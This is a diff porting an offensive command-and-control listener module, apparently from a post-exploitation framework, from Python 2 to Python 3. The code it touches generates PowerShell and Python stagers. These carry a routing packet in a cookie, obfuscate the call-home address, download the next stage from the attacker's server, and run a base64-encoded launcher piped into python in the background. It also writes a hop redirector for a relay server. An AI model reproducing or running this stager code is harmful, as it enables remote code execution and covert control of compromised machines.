@@ -1,3 +1,6 @@
+from __future__ import print_function
+from builtins import str
+from builtins import object
 import base64
 import random
 import os
@@ -9,9 +12,10 @@ from lib.common import agents
 from lib.common import encryption
 from lib.common import packets
 from lib.common import messages
+from lib.common import bypasses
 
 
-class Listener:
+class Listener(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -106,7 +110,7 @@ class Listener:
 
         for key in self.options:
             if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
-                print helpers.color("[!] Option \"%s\" is required." % (key))
+                print(helpers.color("[!] Option \"%s\" is required." % (key)))
                 return False
 
         return True
@@ -118,7 +122,7 @@ class Listener:
         """
 
         if not language:
-            print helpers.color('[!] listeners/http_hop generate_launcher(): no language specified!')
+            print(helpers.color('[!] listeners/http_hop generate_launcher(): no language specified!'))
 
         if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):
 
@@ -195,13 +199,13 @@ class Listener:
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
-                b64RoutingPacket = base64.b64encode(routingPacket)
+                b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")
 
                 # add the RC4 packet to a cookie
                 stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                 stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
 
-                stager += "$ser='%s';$t='%s';" % (helpers.obfuscate_call_home_address(host), stage0)
+                stager += "$ser=%s;$t='%s';" % (helpers.obfuscate_call_home_address(host), stage0)
                 stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
@@ -235,7 +239,7 @@ class Listener:
                         launcherBase += "   sys.exit()\n"
                 except Exception as e:
                     p = "[!] Error setting LittleSnitch in stagger: " + str(e)
-                    print helpers.color(p, color='red')
+                    print(helpers.color(p, color='red'))
 
                 if userAgent.lower() == 'default':
                     userAgent = profile.split('|')[1]
@@ -246,7 +250,7 @@ class Listener:
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
-                b64RoutingPacket = base64.b64encode(routingPacket)
+                b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")
 
                 launcherBase += "import urllib2\n"
 
@@ -297,24 +301,24 @@ class Listener:
                 launcherBase += "exec(''.join(out))"
 
                 if encode:
-                    launchEncoded = base64.b64encode(launcherBase)
+                    launchEncoded = base64.b64encode(launcherBase).decode("UTF-8")
                     launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
 
             else:
-                print helpers.color("[!] listeners/http_hop generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module.")
+                print(helpers.color("[!] listeners/http_hop generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."))
 
         else:
-            print helpers.color("[!] listeners/http_hop generate_launcher(): invalid listener name specification!")
+            print(helpers.color("[!] listeners/http_hop generate_launcher(): invalid listener name specification!"))
 
     def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
         """
         If you want to support staging for the listener module, generate_stager must be
         implemented to return the stage1 key-negotiation stager code.
         """
-        print helpers.color("[!] generate_stager() not implemented for listeners/http_hop")
+        print(helpers.color("[!] generate_stager() not implemented for listeners/http_hop"))
         return ''
 
 
@@ -323,7 +327,7 @@ class Listener:
         If you want to support staging for the listener module, generate_agent must be
         implemented to return the actual staged agent code.
         """
-        print helpers.color("[!] generate_agent() not implemented for listeners/http_hop")
+        print(helpers.color("[!] generate_agent() not implemented for listeners/http_hop"))
         return ''
 
 
@@ -471,9 +475,9 @@ def send_message(packets=None):
                 return updateServers + sendMessage
 
             else:
-                print helpers.color("[!] listeners/http_hop generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module.")
+                print(helpers.color("[!] listeners/http_hop generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."))
         else:
-            print helpers.color('[!] listeners/http_hop generate_comms(): no language specified!')
+            print(helpers.color('[!] listeners/http_hop generate_comms(): no language specified!'))
 
 
     def start(self, name=''):
@@ -515,12 +519,12 @@ def send_message(packets=None):
 
                 with open(saveName, 'w') as f:
                     f.write(hopCode)
-                    print helpers.color("[*] Hop redirector written to %s . Place this file on the redirect server." % (saveName))
+                    print(helpers.color("[*] Hop redirector written to %s . Place this file on the redirect server." % (saveName)))
 
             return True
 
         else:
-            print helpers.color("[!] Redirect listener name %s not a valid listener!" % (redirectListenerName))
+            print(helpers.color("[!] Redirect listener name %s not a valid listener!" % (redirectListenerName)))
             return False
 
 
